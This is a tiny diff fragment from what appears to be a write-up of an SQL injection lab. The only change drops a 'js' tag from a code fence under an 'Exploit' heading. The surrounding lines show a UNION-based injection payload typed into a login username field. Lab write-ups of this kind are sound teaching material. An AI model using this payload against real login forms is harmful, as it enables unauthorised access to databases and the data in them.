@@ -679,7 +679,7 @@ sqli_lab.`K0{`
 
 ## Exploit
 
-```js
+```
 username: ' union select 1,(query),3 -- 1
 
 password: 1
